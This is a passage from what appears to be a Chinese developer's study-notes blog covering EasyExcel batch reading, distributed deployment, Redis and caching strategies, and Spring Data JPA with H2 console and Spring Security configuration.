class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.alibaba/easyexcel --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>easyexcel<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Gradle</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// https://mvnrepository.com/artifact/com.alibaba/easyexcel</span></span><br><span class="line">compile <span class="string">group:</span> <span class="string">'com.alibaba'</span>, <span class="string">name:</span> <span class="string">'easyexcel'</span>, <span class="string">version:</span> <span class="string">'2.2.6'</span></span><br></pre></td></tr></table></figure><p> 功能演示</p><p>这里直接分享官方提供读取 Excel 的例子（<em>在实际项目中我对这部分做了简单的封装，涉及的地方比较多，就不分享出来了</em>）。</p><p><strong>实体对象</strong> （Excel 导入导出实体对象）</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@Data</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="symbol">DemoData</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String <span class="built_in">string</span>;</span><br><span class="line">    <span class="keyword">private</span> Date date;</span><br><span class="line">    <span class="keyword">private</span> Double <span class="built_in">double</span>Data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>监听器</strong> （自定义 <code>AnalysisEventListener</code> 一次读取 5 条数据存储到数据库）</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 有个很重要的点 DemoDataListener 不能被spring管理，要每次读取excel都要new,然后里面用到spring可以构造方法传进去</span></span><br><span class="line">public <span class="keyword">class</span> DemoDataListener extends AnalysisEventListener&lt;DemoData&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> static final Logger LOGGER = <span class="module-access"><span class="module"><span class="identifier">LoggerFactory</span>.</span></span>get<span class="constructor">Logger(DemoDataListener.<span class="params">class</span>)</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 每隔5条存储数据库，实际使用中可以3000条，然后清理list ，方便内存回收</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> static final <span class="built_in">int</span> BATCH_COUNT = <span class="number">5</span>;</span><br><span class="line">    List&lt;DemoData&gt; <span class="built_in">list</span> = <span class="keyword">new</span> ArrayList&lt;DemoData&gt;<span class="literal">()</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 假设这个是一个DAO，当然有业务逻辑这个也可以是一个service。当然如果不用存储这个对象没用。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> DemoDAO demoDAO;</span><br><span class="line">    public <span class="constructor">DemoDataListener()</span> &#123;</span><br><span class="line">        <span class="comment">// 这里是demo，所以随便new一个。实际使用如果到了spring,请使用下面的有参构造函数</span></span><br><span class="line">        demoDAO = <span class="keyword">new</span> <span class="constructor">DemoDAO()</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 如果使用了spring,请使用这个构造方法。每次创建Listener的时候需要把spring管理的类传进来</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @param demoDAO</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="constructor">DemoDataListener(DemoDAO <span class="params">demoDAO</span>)</span> &#123;</span><br><span class="line">        this.demoDAO = demoDAO;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 这个每一条数据解析都会来调用</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @param data</span></span><br><span class="line"><span class="comment">     *            one row value. Is is same as &#123;@link AnalysisContext#readRowHolder()&#125;</span></span><br><span class="line"><span class="comment">     * @param context</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    @Override</span><br><span class="line">    public void invoke(DemoData data, AnalysisContext context) &#123;</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">LOGGER</span>.</span></span>info(<span class="string">"解析到一条数据:&#123;&#125;"</span>, <span class="module-access"><span class="module"><span class="identifier">JSON</span>.</span></span><span class="keyword">to</span><span class="constructor">JSONString(<span class="params">data</span>)</span>);</span><br><span class="line">        <span class="built_in">list</span>.add(data);</span><br><span class="line">        <span class="comment">// 达到BATCH_COUNT了，需要去存储一次数据库，防止数据几万条数据在内存，容易OOM</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">list</span>.size<span class="literal">()</span> &gt;= BATCH_COUNT) &#123;</span><br><span class="line">            save<span class="constructor">Data()</span>;</span><br><span class="line">            <span class="comment">// 存储完成清理 list</span></span><br><span class="line">            <span class="built_in">list</span>.clear<span class="literal">()</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 所有数据解析完成了 都会来调用</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @param context</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    @Override</span><br><span class="line">    public void <span class="keyword">do</span><span class="constructor">AfterAllAnalysed(AnalysisContext <span class="params">context</span>)</span> &#123;</span><br><span class="line">        <span class="comment">// 这里也要保存数据，确保最后遗留的数据也存储到数据库</span></span><br><span class="line">        save<span class="constructor">Data()</span>;</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">LOGGER</span>.</span></span>info(<span class="string">"所有数据解析完成！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 加上存储数据库</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> void save<span class="constructor">Data()</span> &#123;</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">LOGGER</span>.</span></span>info(<span class="string">"&#123;&#125;条数据，开始存储数据库！"</span>, <span class="built_in">list</span>.size<span class="literal">()</span>);</span><br><span class="line">        demoDAO.save(<span class="built_in">list</span>);</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">LOGGER</span>.</span></span>info(<span class="string">"存储数据库成功！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>持久层</strong> (mybatis 或者 jpa 来做都行)</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 假设这个是你的DAO存储。当然还要这个类让spring管理，当然你不用需要存储，也不需要这个类。</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DemoDAO</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">(List&lt;DemoData&gt; <span class="built_in">list</span>)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 如果是mybatis,尽量别直接调用多次insert,自己写一个mapper里面新增一个方法batchInsert,所有数据一次性插入</span></span><br><span class="line">        System.out.<span class="built_in">println</span>(<span class="built_in">list</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>读取数据</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String fileName = <span class="string">"src/test/resources/demo/demo.xlsx"</span>;</span><br><span class="line"><span class="comment">// 这里 需要指定读用哪个class去读，然后读取第一个sheet 文件流会自动关闭</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">EasyExcel</span>.</span></span>read(fileName, <span class="module-access"><span class="module"><span class="identifier">DemoData</span>.</span></span><span class="keyword">class</span>, <span class="keyword">new</span> <span class="constructor">DemoDataListener()</span>).sheet<span class="literal">()</span>.<span class="keyword">do</span><span class="constructor">Read()</span>;</span><br></pre></td></tr></table></figure><p><strong>输出结果</strong> （已过滤非必要数据）</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2020</span><span class="number">-09</span><span class="number">-16</span> <span class="number">08</span>:<span class="number">14</span>:<span class="number">33.727</span> DEBUG [main] com.alibaba.excel.context.AnalysisContextImpl:<span class="number">91</span> - Began to read：ReadSheetHolder&#123;sheetNo=<span class="number">0</span>, sheetName=<span class="string">'Sheet1'</span>&#125; com.alibaba.excel.read.metadata.holder.xlsx.<span class="symbol">XlsxReadSheetHolder@</span><span class="number">6f</span>3b5d16</span><br><span class="line"><span class="number">2020</span><span class="number">-09</span><span class="number">-16</span> <span class="number">08</span>:<span class="number">14</span>:<span class="number">33.870</span> INFO [main] com.alibaba.easyexcel.test.demo.read.DemoDataListener:<span class="number">54</span> - 解析到一条数据:&#123;<span class="string">"date"</span>:<span class="number">1577811661000</span>,<span class="string">"doubleData"</span>:<span class="number">1.0</span>,<span class="string">"string"</span>:<span class="string">"字符串0"</span>&#125;</span><br><span class="line"><span class="number">2020</span><span class="number">-09</span><span class="number">-16</span> <span class="number">08</span>:<span class="number">14</span>:<span class="number">33.870</span> INFO [main] com.alibaba.easyexcel.test.demo.read.DemoDataListener:<span class="number">54</span> - 解析到一条数据:&#123;<span class="string">"date"</span>:<span class="number">1577898061000</span>,<span class="string">"doubleData"</span>:<span class="number">2.0</span>,<span class="string">"string"</span>:<span class="string">"字符串1"</span>&#125;</span><br><span class="line"><span class="number">2020</span><span class="number">-09</span><span class="number">-16</span> <span class="number">08</span>:<span class="number">14</span>:<span class="number">33.871</span> INFO [main] com.alibaba.easyexcel.test.demo.read.DemoDataListener:<span class="number">54</span> - 解析到一条数据:&#123;<span class="string">"date"</span>:<span class="number">1577984461000</span>,<span class="string">"doubleData"</span>:<span class="number">3.0</span>,<span class="string">"string"</span>:<span class="string">"字符串2"</span>&#125;</span><br><span class="line"><span class="number">2020</span><span class="number">-09</span><span class="number">-16</span> <span class="number">08</span>:<span class="number">14</span>:<span class="number">33.871</span> INFO [main] com.alibaba.easyexcel.test.demo.read.DemoDataListener:<span class="number">54</span> - 解析到一条数据:&#123;<span class="string">"date"</span>:<span class="number">1578070861000</span>,<span class="string">"doubleData"</span>:<span class="number">4.0</span>,<span class="string">"string"</span>:<span class="string">"字符串3"</span>&#125;</span><br><span class="line"><span class="number">2020</span><span class="number">-09</span><span class="number">-16</span> <span class="number">08</span>:<span class="number">14</span>:<span class="number">33.872</span> INFO [main] com.alibaba.easyexcel.test.demo.read.DemoDataListener:<span class="number">54</span> - 解析到一条数据:&#123;<span class="string">"date"</span>:<span class="number">1578157261000</span>,<span class="string">"doubleData"</span>:<span class="number">5.0</span>,<span class="string">"string"</span>:<span class="string">"字符串4"</span>&#125;</span><br><span class="line"><span class="number">2020</span><span class="number">-09</span><span class="number">-16</span> <span class="number">08</span>:<span class="number">14</span>:<span class="number">33.872</span> INFO [main] com.alibaba.easyexcel.test.demo.read.DemoDataListener:<span class="number">80</span> - <span class="number">5</span>条数据，开始存储数据库！</span><br><span class="line">[DemoData(<span class="built_in">string</span>=字符串<span class="number">0</span>, date=Wed Jan <span class="number">01</span> <span class="number">01</span>:<span class="number">01</span>:<span class="number">01</span> CST <span class="number">2020</span>, <span class="built_in">double</span>Data=<span class="number">1.0</span>), DemoData(<span class="built_in">string</span>=字符串<span class="number">1</span>, date=Thu Jan <span class="number">02</span> <span class="number">01</span>:<span class="number">01</span>:<span class="number">01</span> CST <span class="number">2020</span>, <span class="built_in">double</span>Data=<span class="number">2.0</span>), DemoData(<span class="built_in">string</span>=字符串<span class="number">2</span>, date=Fri Jan <span class="number">03</span> <span class="number">01</span>:<span class="number">01</span>:<span class="number">01</span> CST <span class="number">2020</span>, <span class="built_in">double</span>Data=<span class="number">3.0</span>), DemoData(<span class="built_in">string</span>=字符串<span class="number">3</span>, date=Sat Jan <span class="number">04</span> <span class="number">01</span>:<span class="number">01</span>:<span class="number">01</span> CST <span class="number">2020</span>, <span class="built_in">double</span>Data=<span class="number">4.0</span>), DemoData(<span class="built_in">string</span>=字符串<span class="number">4</span>, date=Sun Jan <span class="number">05</span> <span class="number">01</span>:<span class="number">01</span>:<span class="number">01</span> CST <span class="number">2020</span>, <span class="built_in">double</span>Data=<span class="number">5.0</span>)]</span><br><span class="line"><span class="number">2020</span><span class="number">-09</span><span class="number">-16</span> <span class="number">08</span>:<span class="number">14</span>:<span class="number">33.874</span> INFO [main] com.alibaba.easyexcel.test.demo.read.DemoDataListener:<span class="number">82</span> - 存储数据库成功！</span><br><span class="line"><span class="number">2020</span><span class="number">-09</span><span class="number">-16</span> <span class="number">08</span>:<span class="number">14</span>:<span class="number">33.875</span> INFO [main] com.alibaba.easyexcel.test.demo.read.DemoDataListener:<span class="number">54</span> - 解析到一条数据:&#123;<span class="string">"date"</span>:<span class="number">1578243661000</span>,<span class="string">"doubleData"</span>:<span class="number">6.0</span>,<span class="string">"string"</span>:<span class="string">"字符串5"</span>&#125;</span><br><span class="line"><span class="number">2020</span><span class="number">-09</span><span class="number">-16</span> <span class="number">08</span>:<span class="number">14</span>:<span class="number">33.875</span> INFO [main] com.alibaba.easyexcel.test.demo.read.DemoDataListener:<span class="number">54</span> - 解析到一条数据:&#123;<span class="string">"date"</span>:<span class="number">1578330061000</span>,<span class="string">"doubleData"</span>:<span class="number">7.0</span>,<span class="string">"string"</span>:<span class="string">"字符串6"</span>&#125;</span><br><span class="line"><span class="number">2020</span><span class="number">-09</span><span class="number">-16</span> <span class="number">08</span>:<span class="number">14</span>:<span class="number">33.876</span> INFO [main] com.alibaba.easyexcel.test.demo.read.DemoDataListener:<span class="number">54</span> - 解析到一条数据:&#123;<span class="string">"date"</span>:<span class="number">1578416461000</span>,<span class="string">"doubleData"</span>:<span class="number">8.0</span>,<span class="string">"string"</span>:<span class="string">"字符串7"</span>&#125;</span><br><span class="line"><span class="number">2020</span><span class="number">-09</span><span class="number">-16</span> <span class="number">08</span>:<span class="number">14</span>:<span class="number">33.876</span> INFO [main] com.alibaba.easyexcel.test.demo.read.DemoDataListener:<span class="number">54</span> - 解析到一条数据:&#123;<span class="string">"date"</span>:<span class="number">1578502861000</span>,<span class="string">"doubleData"</span>:<span class="number">9.0</span>,<span class="string">"string"</span>:<span class="string">"字符串8"</span>&#125;</span><br><span class="line"><span class="number">2020</span><span class="number">-09</span><span class="number">-16</span> <span class="number">08</span>:<span class="number">14</span>:<span class="number">33.876</span> INFO [main] com.alibaba.easyexcel.test.demo.read.DemoDataListener:<span class="number">54</span> - 解析到一条数据:&#123;<span class="string">"date"</span>:<span class="number">1578589261000</span>,<span class="string">"doubleData"</span>:<span class="number">10.0</span>,<span class="string">"string"</span>:<span class="string">"字符串9"</span>&#125;</span><br><span class="line"><span class="number">2020</span><span class="number">-09</span><span class="number">-16</span> <span class="number">08</span>:<span class="number">14</span>:<span class="number">33.877</span> INFO [main] com.alibaba.easyexcel.test.demo.read.DemoDataListener:<span class="number">80</span> - <span class="number">5</span>条数据，开始存储数据库！</span><br><span class="line">[DemoData(<span class="built_in">string</span>=字符串<span class="number">5</span>, date=Mon Jan <span class="number">06</span> <span class="number">01</span>:<span class="number">01</span>:<span class="number">01</span> CST <span class="number">2020</span>, <span class="built_in">double</span>Data=<span class="number">6.0</span>), DemoData(<span class="built_in">string</span>=字符串<span class="number">6</span>, date=Tue Jan <span class="number">07</span> <span class="number">01</span>:<span class="number">01</span>:<span class="number">01</span> CST <span class="number">2020</span>, <span class="built_in">double</span>Data=<span class="number">7.0</span>), DemoData(<span class="built_in">string</span>=字符串<span class="number">7</span>, date=Wed Jan <span class="number">08</span> <span class="number">01</span>:<span class="number">01</span>:<span class="number">01</span> CST <span class="number">2020</span>, <span class="built_in">double</span>Data=<span class="number">8.0</span>), DemoData(<span class="built_in">string</span>=字符串<span class="number">8</span>, date=Thu Jan <span class="number">09</span> <span class="number">01</span>:<span class="number">01</span>:<span class="number">01</span> CST <span class="number">2020</span>, <span class="built_in">double</span>Data=<span class="number">9.0</span>), DemoData(<span class="built_in">string</span>=字符串<span class="number">9</span>, date=Fri Jan <span class="number">10</span> <span class="number">01</span>:<span class="number">01</span>:<span class="number">01</span> CST <span class="number">2020</span>, <span class="built_in">double</span>Data=<span class="number">10.0</span>)]</span><br><span class="line"><span class="number">2020</span><span class="number">-09</span><span class="number">-16</span> <span class="number">08</span>:<span class="number">14</span>:<span class="number">33.877</span> INFO [main] com.alibaba.easyexcel.test.demo.read.DemoDataListener:<span class="number">82</span> - 存储数据库成功！</span><br><span class="line"><span class="number">2020</span><span class="number">-09</span><span class="number">-16</span> <span class="number">08</span>:<span class="number">14</span>:<span class="number">33.877</span> INFO [main] com.alibaba.easyexcel.test.demo.read.DemoDataListener:<span class="number">80</span> - <span class="number">0</span>条数据，开始存储数据库！</span><br><span class="line">[]</span><br><span class="line"><span class="number">2020</span><span class="number">-09</span><span class="number">-16</span> <span class="number">08</span>:<span class="number">14</span>:<span class="number">33.877</span> INFO [main] com.alibaba.easyexcel.test.demo.read.DemoDataListener:<span class="number">82</span> - 存储数据库成功！</span><br><span class="line"><span class="number">2020</span><span class="number">-09</span><span class="number">-16</span> <span class="number">08</span>:<span class="number">14</span>:<span class="number">33.877</span> INFO [main] com.alibaba.easyexcel.test.demo.read.DemoDataListener:<span class="number">73</span> - 所有数据解析完成！</span><br><span class="line"></span><br><span class="line">Process finished with exit code <span class="number">0</span></span><br></pre></td></tr></table></figure><h3 id="分布式"><a href="#分布式" class="headerlink" title="分布式"></a>分布式</h3><p>分布式服务顾名思义服务是分散部署在不同的机器上的，一个服务可能负责几个功能，是一种面向SOA架构的，服务之间也是通过rpc来交互或者是webservice来交互的。逻辑架构设计完后就该做物理架构设计，系统应用部署在超过一台服务器或虚拟机上，且各分开部署的部分彼此通过各种通讯协议交互信息，就可算作分布式部署，生产环境下的微服务肯定是分布式部署的，分布式部署的应用不一定是微服务架构的，比如集群部署，它是把相同应用复制到不同服务器上，但是逻辑功能上还是单体应用。</p><p><img src="../images/java_web/c2VydmljZVR5cGU9MiZzZXJ2aWNlRGF0YT17Im5vdGVHdWlkIjoiMWYzOWNmM2EtNDc5OS00ZDYwLTlmNjUtMzhmNDA0MmFhZDhjIiwicmVzb3VyY0d1aWQiOiI1ZmU1MWU3Ni1mZDFiLTRmYTEtOWNlMS1kZDBlMTQ3MDczY2EifQ==.png" alt="img"></p><p>由于笔记全反到一个md文件内不好管理和详细记录, 所以将 类型给出, 并指出相应的md文件 </p><h4 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h4><p>redis 时一种  开放源代码(BSD许可)的内存中数据结构存储, 用作 数据库, 缓存和 消息代理 , </p><p>Redis 提供的数据结构 </p><p><img src="../images/java_web/image-20210501233735056.png" alt="image-20210501233735056"></p><p>因为Redis 的特性 ,所以可以用来作为 分布式缓存 </p><p><a href="D:/program/writing/Redis.md">Redis详解</a></p><h4 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h4><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%BC%93%E5%AD%98.md#%E5%9B%9B%E7%BC%93%E5%AD%98%E9%97%AE%E9%A2%98" target="_blank" rel="noopener">参考</a></p><p>对资源文件的提前加载, 或对用户实现请求时临时作为存储</p><h5 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h5><p>命中率  </p><p>当某个请求能够通过访问缓存而得到响应时，称为缓存命中。</p><p>缓存命中率越高，缓存的利用率也就越高。</p><p> 最大空间</p><p>缓存通常位于内存中，内存的空间通常比磁盘空间小的多，因此缓存的最大空间不可能非常大。</p><p>当缓存存放的数据量超过最大空间时，就需要淘汰部分数据来存放新到达的数据。</p><p> 淘汰策略</p><ul><li>FIFO（First In First Out）：先进先出策略，在实时性的场景下，需要经常访问最新的数据，那么就可以使用 FIFO，使得最先进入的数据（最晚的数据）被淘汰。</li><li>LRU（Least Recently Used）：最近最久未使用策略，优先淘汰最久未使用的数据，也就是上次被访问时间距离现在最久的数据。该策略可以保证内存中的数据都是热点数据，也就是经常被访问的数据，从而保证缓存命中率。</li><li>LFU（Least Frequently Used）：最不经常使用策略，优先淘汰一段时间内使用次数最少的数据。</li></ul><h5 id="位置"><a href="#位置" class="headerlink" title="位置"></a>位置</h5><p>浏览器 </p><p>当Http响应允许进行缓存时, 浏览器会将HTML, CSS,JavaScript, 图片等静态资源进行缓存 </p><p>ISP</p><p>网络服务提供商(ISP) 是网络访问的第一跳, 通过将数据缓存在ISP中能够大大提高用户的访问速度 </p><p>反向代理</p><p>反向代理位于服务器之前，请求与响应都需要经过反向代理。通过将数据缓存在反向代理，在用户请求反向代理时就可以直接使用缓存进行响应。</p><p>本地缓存</p><p>使用 Guava Cache 将数据缓存在服务器本地内存中，服务器代码可以直接读取本地内存中的缓存，速度非常快。</p><p>分布式缓存</p><p>使用 Redis、Memcache 等分布式缓存将数据缓存在分布式缓存系统中。</p><p>相对于本地缓存来说，分布式缓存单独部署，可以根据需求分配硬件资源。不仅如此，服务器集群都可以访问分布式缓存，而本地缓存需要在服务器集群之间进行同步，实现难度和性能开销上都非常大。</p><p>数据库缓存</p><p>MySQL 等数据库管理系统具有自己的查询缓存机制来提高查询效率。</p><p>Java内部缓存</p><p>Java 为了优化空间，提高字符串、基本数据类型包装类的创建效率，设计了字符串常量池及 Byte、Short、Character、Integer、Long、Boolean 这六种包装类缓冲池。</p><p>CPU多级缓存</p><p>CPU 为了解决运算速度与主存 IO 速度不匹配的问题，引入了多级缓存结构，同时使用 MESI 等缓存一致性协议来解决多核 CPU 缓存数据一致性的问题。</p><h3 id="JPA"><a href="#JPA" class="headerlink" title="JPA"></a>JPA</h3><p><a href="https://zhuanlan.zhihu.com/p/121786644" target="_blank" rel="noopener">参考</a></p><p>springboot  中添加JPA依赖后需要创建实体类实现数据表的建立</p><p>在写mapper接口时不需要具体实现, 继承 CrudRepository 类 会自动实现接口内方法 </p><p>JPA对象将保存到数据库并从数据库中获取他们, 都不需要编写具体的存储库实现 </p><p><strong>原理</strong></p><p>​    是一种规范, Hibernate 是它的一种是实现</p><p><strong>能力</strong></p><p>定义了独特的JPQL（Java Persistence Query Language）,是EJB QL 的一种扩展, 针对实体的一种查询语言, 操作对象是实体, 而不是关系数据库的表, 支持 批量更新和修改 </p><p> JPA中能够支持面向对象的高级特性 </p><p>需要注意的是 ,jpa可以自动创建 sql语句,也支持自定义sql , 自动创建sql是分析函数的命名去自动生成查询 , </p><p><img src="../images/java_web/image-20210429200647233.png" alt="image-20210429200647233"></p><p> 因为基于函数命名 所以再写函数时要注意名字 </p><p>,包括其它地方使用的时候也需要注意 </p><p><img src="../images/java_web/image-20210501145935863.png" alt="image-20210501145935863"></p><p>jpa 自动生成sql语句时参数基于接口中的参数  JPA中Repository 接口中一般添加的为实例类和 主键为id 的类型, </p><p>不包含没有声明过的类型 . </p><p>jpaRepository 中扩展了其它的jp Repository, 提供了比较的sql 使用 </p><p>使用 spring Security时</p><p>访问网页会默认带访问限制 ,默认username 为: user  密码在控制台中随机生成</p><p><img src="../images/java_web/image-20210424220230138.png" alt="image-20210424220230138"></p><h4 id="配置h2数据库"><a href="#配置h2数据库" class="headerlink" title="配置h2数据库"></a>配置h2数据库</h4><p>h2为内存数据库 </p><p>H2提供了一个名为H2 Console的Web界面来查看数据。让我们在application.properties中启用h2控制台。</p><p>/src/main/resources/application.properties中加入：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spring.h2.console.enabled=<span class="literal">true</span></span><br></pre></td></tr></table></figure><p>访问<a href="http://localhost:8080/h2-console/" target="_blank" rel="noopener">http://localhost:8080/h2-console/</a> 直接点击进入</p><p>如果使用了spring-security , 则需要输入user 和 passwoed(自动给出)</p><p>或者自己配置</p><p>就H2而言，只要Spring Boot在类路径中看到H2，它就会自动配置类似于下面所示的数据源：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">spring.datasource.url=jdbc:h2:mem:testdb      spring.datasource.driverClassName=org.h2.Driver      spring.datasource.username=sa      spring.datasource.password=</span><br><span class="line">spring.jpa.database-platform=org.hibernate.dialect.H2Dialect</span><br></pre></td></tr></table></figure><p>注意：JDBC URL默认是jdbc:h2:~/test，而Spring Boot的默认数据库url应该是jdbc:h2:mem:testdb，否则进去后找不到JPA创建的数据表PRODUCT:</p><p>使用SpringSecurity 的时候需要配置Securit 为 H2增加权限 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">configure</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      http.authorizeRequests()</span><br><span class="line">              .antMatchers(<span class="string">"/h2-conslole/**"</span>).permitAll() <span class="comment">//放行h2后台</span></span><br><span class="line">              .and().csrf().ignoringAntMatchers(<span class="string">"/h2-console/**"</span>)  <span class="comment">// 禁用 H2-console csrf防护</span></span><br><span class="line">              .and().headers().frameOptions().sameOrigin();  <span class="comment">// 允许来自同一来源的 H2 控制台的请求</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h4 id="sql语句"><a href="#sql语句" class="headerlink" title="sql语句"></a>sql语句</h4><h5 id="Quety"><a href="#Quety" class="headerlink" title="@Quety"></a>@Quety</h5><p><a href="https://docs.spring.io/spring-data/jpa/docs/2.5.0/reference/html/#jpa.query-methods.at-query" target="_blank" rel="noopener">官方 </a></p><h6 id="like"><a href="#like" class="headerlink" title="like"></a>like</h6><p><img src="../images/java_web/image-20210429000504417.png" alt="image-20210429000504417"></p><p>LIKE分隔符 : %</p><h6 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h6><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public interface UserRepository extends JpaRepository&lt;User, Long&gt; &#123;</span><br><span class="line"></span><br><span class="line">  @<span class="constructor">Query(<span class="string">"select u from User u where u.lastname like ?1%"</span>)</span></span><br><span class="line">  List&lt;User&gt; find<span class="constructor">ByAndSort(String <span class="params">lastname</span>, Sort <span 